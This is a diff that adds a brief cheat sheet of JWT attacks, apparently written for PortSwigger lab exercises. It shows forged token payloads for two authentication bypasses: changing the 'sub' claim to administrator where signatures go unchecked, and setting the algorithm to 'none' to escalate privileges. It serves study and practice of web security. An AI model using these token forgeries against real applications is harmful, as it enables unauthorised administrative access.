@@ -1,0 +1,46 @@
+==============================================================================
+[+] JWT Attacks
+==============================================================================
+
+# 1. JWT authentication bypass via unverified signature
+# Use "Json Web Token extension"
+# Change or modify manually the sub variables to escalate privileges
+
+# original payload:
+{
+    "iss": "123465",
+    "sub": "Costumer",
+    "exp": 1660653822
+}
+# Change Sub variable by Administrator
+{
+    "iss": "123465",
+    "sub": "Administrator",
+    "exp": 1660653822
+}
+
+# 2. JWT authentication bypass via flawed signature verification
+# Use "Json Web Token extension"
+# On attack button select '"none" Signing Algorithm'
+# Change or modify manually the sub variables to escalate privileges
+
+# original payload:
+{
+    "kid": "fb292028-1634-416f-a76e-0e842abc8fa9",
+    "alg": "RS256"
+}
+{
+    "iss": "123465",
+    "sub": "Costumer",
+    "exp": 1660653822
+}
+# changed payload:
+{
+    "typ": "JWT",
+    "alg": "none"
+}
+{
+    "iss": "portswigger",
+    "sub": "administrator",
+    "exp": 1660654482
+}
